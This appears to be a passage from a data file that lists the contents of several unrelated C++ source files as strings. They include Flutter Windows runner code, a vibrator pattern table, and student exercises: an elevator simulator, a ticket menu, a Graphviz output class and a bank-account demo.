MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n * Copyright (c) 2021, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n#include <string.h>\n#include <errno.h>\n\n#include \"VibratorPatterns.h\"\n\n#define ARRAY_SIZE(a) (sizeof(a) / sizeof(*(a)))\n\nstatic const uint8_t effect_0[] = {\n    /* (Amp MSB 1 bit) (Amp LSB 8bit) (Period)  FLRA */\n    0x00, 0x1F, S_PERIOD_T_LRA, 0,\n    0x00, 0x3F, S_PERIOD_T_LRA, 0,\n    0x00, 0x5F, S_PERIOD_T_LRA, 0,\n    0x00, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x5F, S_PERIOD_T_LRA, 0,\n    0x01, 0x3F, S_PERIOD_T_LRA, 0,\n    0x01, 0x1F, S_PERIOD_T_LRA, 0,\n};\n\nstatic const uint8_t effect_1[] = {\n    0x00, 0x1F, S_PERIOD_T_LRA, 0,\n    0x00, 0x3F, S_PERIOD_T_LRA, 0,\n    0x00, 0x5F, S_PERIOD_T_LRA, 0,\n    0x00, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x5F, S_PERIOD_T_LRA, 0,\n    0x01, 0x3F, S_PERIOD_T_LRA, 0,\n    0x01, 0x1F, S_PERIOD_T_LRA, 0,\n};\n\nstatic const uint8_t effect_2[] = {\n    0x00, 0x1F, S_PERIOD_T_LRA, 0,\n    0x00, 0x3F, S_PERIOD_T_LRA, 0,\n    0x00, 0x5F, S_PERIOD_T_LRA, 0,\n    0x00, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x5F, S_PERIOD_T_LRA, 0,\n    0x01, 0x3F, S_PERIOD_T_LRA, 0,\n    0x01, 0x1F, S_PERIOD_T_LRA, 0,\n};\n\nstatic const uint8_t effect_3[] = {\n    0x00, 0x1F, S_PERIOD_T_LRA, 0,\n    0x00, 0x3F, S_PERIOD_T_LRA, 0,\n    0x00, 0x5F, S_PERIOD_T_LRA, 0,\n    0x00, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x5F, S_PERIOD_T_LRA, 0,\n    0x01, 0x3F, S_PERIOD_T_LRA, 0,\n    0x01, 0x1F, S_PERIOD_T_LRA, 0,\n};\n\nstatic const uint8_t effect_4[] = {\n    0x00, 0x1F, S_PERIOD_T_LRA, 0,\n    0x00, 0x3F, S_PERIOD_T_LRA, 0,\n    0x00, 0x5F, S_PERIOD_T_LRA, 0,\n    0x00, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x5F, S_PERIOD_T_LRA, 0,\n    0x01, 0x3F, S_PERIOD_T_LRA, 0,\n    0x01, 0x1F, S_PERIOD_T_LRA, 0,\n};\n\nstatic const uint8_t effect_5[] = {\n    0x00, 0x1F, S_PERIOD_T_LRA, 0,\n    0x00, 0x3F, S_PERIOD_T_LRA, 0,\n    0x00, 0x5F, S_PERIOD_T_LRA, 0,\n    0x00, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x7F, S_PERIOD_T_LRA, 0,\n    0x01, 0x5F, S_PERIOD_T_LRA, 0,\n    0x01, 0x3F, S_PERIOD_T_LRA, 0,\n    0x01, 0x1F, S_PERIOD_T_LRA, 0,\n};\n\nstatic const uint8_t effect_6[] = {\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,\n    0x02, 0x02, 0x02, 0x02, 0x02, 0x03, 0x03, 0x03, 0x04, 0x04,\n    0x04, 0x05, 0x05, 0x05, 0x06, 0x06, 0x07, 0x08, 0x08, 0x09,\n    0x0a, 0x0b, 0x0c, 0x0c, 0x0d, 0x0e, 0x0f, 0x0f, 0x0f, 0x0f,\n    0x0f, 0x0f, 0x0e, 0x0e, 0x0d, 0x0c, 0x0b, 0x0a, 0x09, 0x08,\n    0x06, 0x05, 0x03, 0x01, 0x00, 0xff, 0xfd, 0xfa, 0xf8, 0xf6,\n    0xf3, 0xf1, 0xee, 0xec, 0xe9, 0xe6, 0xe3, 0xe0, 0xdc, 0xd9,\n    0xd5, 0xd1, 0xcd, 0xc8, 0xc4, 0xbf, 0xbb, 0xb9, 0xb7, 0xb6,\n    0xb7, 0xb8, 0xba, 0xbd, 0xc1, 0xc5, 0xcb, 0xd1, 0xd7, 0xde,\n    0xe5, 0xed, 0xf5, 0xfd, 0x04, 0x0d, 0x15, 0x1e, 0x26, 0x2e,\n    0x36, 0x3d, 0x44, 0x4b, 0x51, 0x56, 0x5b, 0x5f, 0x62, 0x64,\n    0x65, 0x65, 0x64, 0x63, 0x5f, 0x5b, 0x56, 0x50, 0x4a, 0x45,\n    0x3f, 0x3a, 0x34, 0x2f, 0x29, 0x24, 0x1f, 0x1a, 0x14, 0x0f,\n    0x0a, 0x05, 0x00, 0xfc, 0xf8, 0xf3, 0xef, 0xea, 0xe6, 0xe2,\n    0xdf, 0xdc, 0xd9, 0xd6, 0xd4, 0xd3, 0xd2, 0xd1, 0xd1, 0xd1,\n    0xd2, 0xd4, 0xd7, 0xda, 0xde, 0xe2, 0xe8, 0xee, 0xf6, 0xfd,\n    0x02, 0x08, 0x0d, 0x12, 0x16, 0x1a, 0x1d, 0x20, 0x23, 0x26,\n    0x28, 0x2a, 0x2b, 0x2d, 0x2e, 0x2f, 0x30, 0x30, 0x30, 0x31,\n    0x31, 0x31, 0x31, 0x30, 0x30, 0x2f, 0x2f, 0x2e, 0x2d,",
    "/*\r\n * Copyright 2023 University of Michigan EECS183\r\n *\r\n * Elevator.cpp\r\n * Project UID 28eb18c2c1ce490aada441e65559efdd\r\n *\r\n * <#Names#>\r\n * <#Uniqnames#>\r\n *\r\n * Final Project - Elevators\r\n */\r\n\r\n#include \"Elevator.h\"\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nvoid Elevator::tick(int currentTime) {\r\n    if ((currentTime % TICKS_PER_ELEVATOR_MOVE == 0) && servicing) {\r\n        if(currentFloor < targetFloor) {\r\n            currentFloor++;\r\n        }\r\n        else if(currentFloor > targetFloor) {\r\n            currentFloor--;\r\n        }\r\n        else {\r\n            return;\r\n        }\r\n    }\r\n\r\n    if (currentFloor == targetFloor) {\r\n        servicing = false;\r\n    }\r\n    return;\r\n}\r\n\r\nvoid Elevator::serviceRequest(int floorNum) {\r\n    targetFloor = floorNum;\r\n    servicing = true;\r\n    return;\r\n}\r\n\r\n//////////////////////////////////////////////////////\r\n////// DO NOT MODIFY ANY CODE BENEATH THIS LINE //////\r\n//////////////////////////////////////////////////////\r\n\r\nvoid Elevator::print(ostream &outs) {\r\n    outs << currentFloor;\r\n    if (!servicing){\r\n        outs << \"w\";\r\n    } else {\r\n        outs << \"s\" << targetFloor;\r\n    }\r\n}\r\n\r\nElevator::Elevator() {\r\n    currentFloor = 0;\r\n    servicing = false;\r\n\ttargetFloor = 0;\r\n}\r\n\r\nvoid Elevator::setCurrentFloor(int currentFloorIn) {\r\n    currentFloor = currentFloorIn;\r\n}\r\n\r\nbool Elevator::isServicing() const {\r\n\treturn servicing;\r\n}\r\n\r\nint Elevator::getCurrentFloor() const {\r\n    return currentFloor;\r\n}\r\n\r\nint Elevator::getTargetFloor() const {\r\n    return targetFloor;\r\n}\r\n",
    "#include <iostream>\r\n#include <string.h>\r\n#include <cstdlib>\r\n\r\nusing namespace std;\r\n\r\nstring nama, telepon;\r\n\r\nint main() {\r\n    int pesanTkt;\r\n    do {\r\n        cout << endl;\r\n        cout << \"\\t\\t\\t ==============***============ \\t\\t\\t\" << endl;\r\n        cout << \"\\t\\t\\t | INFORA RAMADHAN FEST 2024 |\\t\\t\\t\" << endl;\r\n        cout << \"\\t\\t\\t ============================= \\t\\t\\t\" << endl;\r\n        cout << \"\\t Menu Pembelian Tiket \\t\" << endl;\r\n        cout << \"\\t -----------------------------------------------------------------\\t\" << endl;\r        cout << \"\\t Jenis Tiket |     Harga     |             Keterangan             \" << endl;\r\n        cout << \"\\t Reguler     | Rp. 20.000,00 | Akses semua venue, Single Entry    \" << endl;\r\n        cout << \"\\t VIP         | Rp. 30.000,00 | Akses semua venue, Multiple Entry  \" << endl;\r\n        cout << \"\\t -----------------------------------------------------------------\\t\" << endl;\r\n        cout << \"\\t Keluar(3)\";\r\n        cout << \"\\t Pesan Tiket (1)/(2): \";\r\n        cin >> pesanTkt;;\r\n\r\n        char konfirmasi;\r\n        switch (pesanTkt) {\r\n        do{\r\n            case 1:\r\n            cout << \"Ingin memesan tiket 'Reguler'? \";\r\n            cin >> konfirmasi;\r\n            if (konfirmasi == 'y' || konfirmasi == 'Y') {\r\n                cout << \"Masukkan nama dan nomor ponsel Anda!\" << endl;\r\n                cout << \"Nama Lengkap: \";\r\n                cin >> nama;\r\n                cout << endl;\r\n                cout << \"No. Handphone: \";\r\n                cin >> telepon;\r\n                cout << \"Pesanan telah dibuat, segera melakukan pembayaran\\nuntuk mendapatkan tiket!\";\r\n            } else {\r\n                cout << \"Input salah!\";\r\n            }\r\n        }while (konfirmasi == 'n' || konfirmasi == 'N');\r\n            cout << \"\\nKembali ke menu...\";\r\n        }\r\n    }while (pesanTkt != 3);\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//---------- R\u00e9alisation de la classe <Affichage> (Affichage.cpp) ------------\r\n\r\n//---------------------------------------------------------------- INCLUDE\r\n\r\n//-------------------------------------------------------- Include syst\u00e8me\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\nusing namespace std;\r\n\r\n//------------------------------------------------------ Include personnel\r\n#include \"Affichage.h\"\r\n\r\n//------------------------------------------------------------- Constantes\r\n\r\n//----------------------------------------------------------------- PUBLIC\r\n\r\n//----------------------------------------------------- M\u00e9thodes publiques\r\nvoid Affichage::AfficherTop10(vector<string> top10, unordered_map<string, int> nbReferences){\r\n    if (top10.size() == 0){\r\n        cout << \"Le Top 10 est vide\" << endl; // Affiche un message si le Top 10 est vide\r\n    }\r\n    else{\r\n        cout << \"Top 10 des pages les plus consult\u00e9es : \" << endl; // Affiche un message pour indiquer le d\u00e9but du Top 10\r\n        for (int i = 0; i < top10.size(); i++){  // Affiche chaque page du Top 10 avec le nombre de hits correspondant\r\n            cout << i+1 << \" - \" << top10[i] << \" (\" << nbReferences[top10[i]] << \" hits)\" << endl;\r\n        }\r\n    }\r\n} //----- Fin de AfficherTop10\r\n\r\nvoid Affichage::AfficherGraphe(unordered_map<string, unordered_map<string, int>> adjacence, bool png, string nomFichier){\r\n    ofstream fichier(nomFichier, ios::out | ios::trunc); // Ouvre un fichier en mode \u00e9criture et tronque le contenu existant\r\n    if(fichier){\r\n        fichier << \"digraph {\" << endl;\r\n        for (auto it = adjacence.begin(); it != adjacence.end(); it++){ // Parcourt la liste d'adjacence\r\n            for (auto it2 = it->second.begin(); it2 != it->second.end(); it2++){ // Parcourt les valeurs associ\u00e9es \u00e0 chaque cl\u00e9 du graphe\r\n                fichier << it2->first << \" -> \" << it->first << \" [label=\" << it2->second << \"];\" << endl; // \u00c9crit une ligne repr\u00e9sentant une relation dans le graphe\r\n            }\r\n        }\r\n        fichier << \"}\" << endl; \r\n        fichier.close(); \r\n        if (png){\r\n        std::string nomFichierSortie = nomFichier.substr(0, nomFichier.find_last_of(\".\")) + \".png\";\r\n        std::system((\"dot -Tpng -o \" + nomFichierSortie + \" \" + nomFichier).c_str()); // Ex\u00e9cute la commande syst\u00e8me pour g\u00e9n\u00e9rer une image PNG \u00e0 partir du fichier graphe.dot\r\n        std::system((\"eog \" + nomFichierSortie).c_str()); // Ex\u00e9cute la commande syst\u00e8me pour ouvrir l'image PNG avec l'application eog\r\n        }\r\n    }\r\n    else{\r\n        cerr << \"Erreur \u00e0 l'ouverture !\" << endl; // Affiche un message d'erreur si le fichier n'a pas pu \u00eatre ouvert\r\n    }\r\n} //----- Fin de AfficherGraphe\r\n\r\n// Constructeur\r\nAffichage::Affichage()\r\n{\r\n    #ifdef MAP\r\n        cout << \"Appel au constructeur de <Affichage>\" << endl;\r\n    #endif \r\n} //----- Fin de Affichage\r\n \r\n// Destructeur\r\nAffichage::~Affichage()\r\n{\r\n    #ifdef MAP\r\n        cout << \"Appel au destructeur de <Affichage>\" << endl;\r\n    #endif\r\n} //----- Fin de ~Affichage",
    "\ufeff#include <iostream>\n#include <string>\n#include <Windows.h>\n#pragma execution_character_set(\"utf-8\")\n\nusing namespace std;\n\nclass BankAccount {\nprivate:\n    int accountNumber; // \u041d\u043e\u043c\u0435\u0440 \u0431\u0430\u043d\u043a\u043e\u0432\u0441\u043a\u043e\u0433\u043e \u0441\u0447\u0451\u0442\u0430\n    double balance; // \u0411\u0430\u043b\u0430\u043d\u0441\n    double interestRate; // \u041f\u0440\u043e\u0446\u0435\u043d\u0442\u043d\u0430\u044f \u0441\u0442\u0430\u0432\u043a\u0430\n\npublic:\n    // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043d\u043e\u043c\u0435\u0440\u0430 \u0441\u0447\u0451\u0442\u0430 \u0438 \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u0431\u0430\u043b\u0430\u043d\u0441\u0430\n    BankAccount(int accountNumber, double initialBalance)\n        : accountNumber(accountNumber), balance(initialBalance), interestRate(0.0) {}\n\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u043d\u0435\u0441\u0435\u043d\u0438\u044f \u0441\u0440\u0435\u0434\u0441\u0442\u0432 \u043d\u0430 \u0441\u0447\u0451\u0442\n    void Deposit(double amount) {\n        if (amount > 0) {\n            this->balance += amount;\n            cout << \"\u041f\u043e\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u0441\u0447\u0451\u0442\u0430 \u043f\u0440\u043e\u0448\u043b\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e. \u041d\u043e\u0432\u044b\u0439 \u0431\u0430\u043b\u0430\u043d\u0441: \" << this->balance << endl;\n        }\n        else {\n            cout << \"\u041d\u0435\u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u0432\u043d\u0435\u0441\u0442\u0438 \u043e\u0442\u0440\u0438\u0446\u0430\u0442\u0435\u043b\u044c\u043d\u0443\u044e \u0441\u0443\u043c\u043c\u0443.\" << endl;\n        }\n    }\n\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0441\u043d\u044f\u0442\u0438\u044f \u0441\u0440\u0435\u0434\u0441\u0442\u0432 \u0441\u043e \u0441\u0447\u0451\u0442\u0430\n    void Withdraw(double amount) {\n        if (amount > 0 && amount <= this->balance) {\n            this->balance -= amount;\n            cout << \"\u0421\u043d\u044f\u0442\u0438\u0435 \u0441\u0440\u0435\u0434\u0441\u0442\u0432 \u0441\u043e \u0441\u0447\u0451\u0442\u0430 \u043f\u0440\u043e\u0448\u043b\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e. \u041d\u043e\u0432\u044b\u0439 \u0431\u0430\u043b\u0430\u043d\u0441: \" << this->balance << endl;\n        }\n        else {\n            cout << \"\u041d\u0435\u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e \u0441\u0440\u0435\u0434\u0441\u0442\u0432 \u043d\u0430 \u0441\u0447\u0451\u0442\u0435 \u0438\u043b\u0438 \u0441\u0443\u043c\u043c\u0430 \u0441\u043d\u044f\u0442\u0438\u044f \u043e\u0442\u0440\u0438\u0446\u0430\u0442\u0435\u043b\u044c\u043d\u0430.\" << endl;\n        }\n    }\n\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f \u0442\u0435\u043a\u0443\u0449\u0435\u0433\u043e \u0431\u0430\u043b\u0430\u043d\u0441\u0430\n    double GetBalance() {\n        return this->balance;\n    }\n\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u043d\u043e\u0439 \u0441\u0442\u0430\u0432\u043a\u0438\n    void SetInterestRate(double newInterestRate) {\n        this->interestRate = newInterestRate;\n        cout << \"\u041f\u0440\u043e\u0446\u0435\u043d\u0442\u043d\u0430\u044f \u0441\u0442\u0430\u0432\u043a\u0430 \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0430 \u0434\u043e: \" << this->interestRate << endl;\n        cout << \"\u0422\u0435\u043a\u0443\u0449\u0430\u044f \u0441\u0443\u043c\u043c\u0430 \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u043e\u0432, \u0437\u0430\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u043d\u044b\u0445 \u043d\u0430 \u0441\u0447\u0451\u0442\u0435: \" << this->GetInterest() << endl;\n    }\n\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0440\u0430\u0441\u0447\u0451\u0442\u0430 \u0438 \u0432\u043e\u0437\u0432\u0440\u0430\u0442\u0430 \u0441\u0443\u043c\u043c\u044b \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u043e\u0432, \u0437\u0430\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u043d\u044b\u0445 \u043d\u0430 \u0441\u0447\u0451\u0442\u0435\n    double GetInterest() {\n        return this->balance * this->interestRate * (1.0 / 12.0);\n    }\n\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f \u043d\u043e\u043c\u0435\u0440\u0430 \u0431\u0430\u043d\u043a\u043e\u0432\u0441\u043a\u043e\u0433\u043e \u0441\u0447\u0451\u0442\u0430\n    int GetAccountNumber() {\n        return this->accountNumber;\n    }\n};\n\n// \u0414\u0440\u0443\u0436\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u0430\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0432\u043e\u0434\u0430 \u0441\u0440\u0435\u0434\u0441\u0442\u0432\nbool Transfer(BankAccount& fromAccount, BankAccount& toAccount, double amount) {\n    if (amount > 0 && amount <= fromAccount.GetBalance()) {\n        fromAccount.Withdraw(amount);\n        toAccount.Deposit(amount);\n        cout << \"\u041f\u0435\u0440\u0435\u0432\u043e\u0434 \u0441\u0440\u0435\u0434\u0441\u0442\u0432 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d \u0443\u0441\u043f\u0435\u0448\u043d\u043e.\" << endl;\n        return true;\n    }\n    else {\n        cout << \"\u041f\u0435\u0440\u0435\u0432\u043e\u0434 \u0441\u0440\u0435\u0434\u0441\u0442\u0432 \u043d\u0435 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d. \u041d\u0435\u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e \u0441\u0440\u0435\u0434\u0441\u0442\u0432 \u043d\u0430 \u043f\u0435\u0440\u0432\u043e\u043c \u0441\u0447\u0451\u0442\u0435.\" << endl;\n        return false;\n    }\n}\n\nint main() {\n    SetConsoleCP(65001); // \u0443\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u043a\u043e\u0434\u0438\u0440\u043e\u0432\u043a\u0443 \u0432\u0445\u043e\u0434\u044f\u0449\u0435\u0433\u043e \u043f\u043e\u0442\u043e\u043a\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u043d\u0430 UTF-8\n    SetConsoleOutputCP(65001); // \u0443\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u043a\u043e\u0434\u0438\u0440\u043e\u0432\u043a\u0443 \u0438\u0441\u0445\u043e\u0434\u044f\u0449\u0435\u0433\u043e \u043f\u043e\u0442\u043e\u043a\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u043d\u0430 UTF-8\n\n    // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0434\u0432\u0443\u0445 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432 BankAccount\n    BankAccount account1(123456, 1000), account2(654321, 2000);\n\n\n    double updatedInterestRate;\n    // \u0426\u0438\u043a\u043b \u0434\u043b\u044f \u0432\u044b\u0431\u043e\u0440\u0430 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0439\n    while (true) {\n        cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435:\" << endl;\n        cout << \"1. \u0412\u043d\u0435\u0441\u0442\u0438 \u0441\u0440\u0435\u0434\u0441\u0442\u0432\u0430 \u043d\u0430 \u0441\u0447\u0451\u0442\" << endl;\n        cout << \"2. \u0421\u043d\u044f\u0442\u044c \u0441\u0440\u0435\u0434\u0441\u0442\u0432\u0430 \u0441\u043e \u0441\u0447\u0451\u0442\u0430\" << endl;\n        cout << \"3. \u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0442\u0435\u043a\u0443\u0449\u0438\u0439 \u0431\u0430\u043b\u0430\u043d\u0441\" << endl;\n        cout << \"4. \u0420\u0430\u0441\u0447\u0451\u0442 \u0438 \u0432\u044b\u0432\u043e\u0434 \u0441\u0443\u043c\u043c\u044b \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u043e\u0432, \u0437\u0430\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u043d\u044b\u0445 \u043d\u0430 \u0441\u0447\u0451\u0442\u0435\" << endl;\n        cout << \"5. \u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u043d\u043e\u0439 \u0441\u0442\u0430\u0432\u043a\u0438\" << endl;\n        cout << \"6. \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043d\u043e\u043c\u0435\u0440\u0430 \u0431\u0430\u043d\u043a\u043e\u0432\u0441\u043a\u043e\u0433\u043e \u0441\u0447\u0451\u0442\u0430\" << endl;\n        cout << \"7. \u041f\u0435\u0440\u0435\u0432\u043e\u0434 \u0441\u0440\u0435\u0434\u0441\u0442\u0432\" << endl;\n        cout << \"0. \u0412\u044b\u0445\u043e\u0434\\n\" << endl;\n\n        int choice;\n        cin >> choice;\n\n        double amount;\n\n        switch (choice) {\n        case 1:\n            cin >> amount;\n            account1.Deposit(amount);\n            break;\n        case 2:\n            cin >> amount;\n            account2.Withdraw(amount);\n            break;\n        case 3:\n            cout << \"\u0422\u0435\u043a\u0443\u0449\u0438\u0439 \u0431\u0430\u043b\u0430\u043d\u0441 \u043f\u0435\u0440\u0432\u043e\u0433\u043e \u0441\u0447\u0451\u0442\u0430: \" << account1.GetBalance() << endl;\n            break;\n        case 4:\n            updatedInterestRate = account1.GetInterest();\n\n            if (updatedInterestRate <= 0) {\n                cout << \"\u0412\u044b \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e \u0432\u0432\u0435\u043b\u0438 \u0434\u0430\u043d\u043d\u044b\u0435! \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430!\" << endl;\n                break;\n            }\n            else {\n                cout << \"\u041f\u0440\u043e\u0446\u0435\u043d\u0442\u044b, \u0437\u0430\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u043d\u044b\u0435 \u043d\u0430 \u0441\u0447\u0451\u0442\u0435: \" << updatedInterestRate << endl;\n                break;\n            }\n        case 5:\n            updatedInterestRate;\n            cin >> updatedInterestRate;\n            account1.SetInterestRate(updatedInterestRate);\n            break;\n        case 6:\n            cout << \"\u041d\u043e\u043c\u0435\u0440 \u043f\u0435\u0440\u0432\u043e\u0433\u043e \u0441\u0447\u0451\u0442\u0430: \" << account1.GetAccountNumber() << endl;\n            break;\n        case 7:\n            cin >> amount;\n            Transfer(account2, account1, amount);\n            break;\n        case 0:\n            return 0;\n        default:\n            cout << \"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0432\u044b\u0431\u043e\u0440. \u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 \u0438\u0437 \u0441\u043f\u0438\u0441\u043a\u0430.\" << endl;\n        }\n    }\n\n    return 0;\n}",
